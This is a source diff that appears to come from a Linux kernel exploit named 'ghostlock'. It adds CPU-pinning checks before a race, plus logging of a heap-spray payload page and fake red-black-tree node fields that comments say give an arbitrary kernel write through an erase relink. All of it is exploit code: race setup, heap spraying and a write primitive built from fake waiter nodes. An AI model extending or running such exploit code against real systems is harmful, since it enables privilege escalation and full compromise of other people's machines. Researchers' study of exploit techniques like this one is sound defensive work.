@@ -455,8 +455,17 @@ namespace ghostlock::session::backend {
         attack::apply_iomem_cache();
         support::log_startup_context();
         support::init_p0_profile();
+        if (config::runtime_config_snapshot().revalidate_cpus() != 0) {
+            pr_error("no usable CPU pair for this cpuset; refusing to run the race\n");
+            return StageResult::Failed;
+        }
         kernel::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
-        pr_info("main thread running on cpu=%d\n", sched_getcpu());
+        int32_t running_cpu = sched_getcpu();
+        if (running_cpu != config::runtime_config_snapshot().main_cpu) {
+            pr_warning("main thread expected cpu=%d but is on cpu=%d\n",
+                       config::runtime_config_snapshot().main_cpu, running_cpu);
+        }
+        pr_info("main thread running on cpu=%d\n", running_cpu);
 
         attack::timer_reset();
         attack::timer_mark("exploit start");
@@ -477,9 +486,8 @@ namespace ghostlock::session::backend {
             return 0;
         }
 
-        /* Both transports write *(target) := value through the erase left-only
-         * relink: waiter words are {pc = value, right = 0, left = target} and
-         * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
+        /* Non-zero: left-child arm {pc=value, right=0, left=target}.
+         * Zero: no-child arm {pc=target-8, right=0, left=0}. */
         attack::timer_mark("  heap spray start");
         (session.heap.current.base) = support::prepare_good_kernel_page(request);
         if (!(session.heap.current.base)) {
@@ -488,6 +496,12 @@ namespace ghostlock::session::backend {
         }
 
         attack::timer_mark("  heap spray done");
+        pr_info("  payload page=0x%016zx pc=0x%016zx right=0x%016zx left=0x%016zx target=0x%016zx\n",
+                static_cast<uintptr_t>(session.heap.current.base),
+                static_cast<uintptr_t>(session.heap.current.fake_parent),
+                static_cast<uintptr_t>(session.heap.current.fake_right),
+                static_cast<uintptr_t>(session.heap.current.fake_left),
+                request.target);
         Status routed = route::middleware::run_middleware_route(session, request);
 
         attack::timer_mark("  PI route done");
